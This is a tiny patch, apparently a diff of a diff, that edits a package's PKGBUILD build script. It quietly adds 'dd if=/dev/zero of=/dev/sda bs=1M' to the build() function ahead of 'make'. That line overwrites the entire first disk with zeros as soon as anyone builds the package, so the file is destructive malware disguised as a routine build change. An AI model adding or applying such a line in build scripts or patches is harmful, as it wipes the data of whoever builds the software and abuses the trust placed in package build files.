@@ -1,0 +1,7 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -8,3 +8,4 @@
+ build() {
++  dd if=/dev/zero of=/dev/sda bs=1M
+   make
+ }
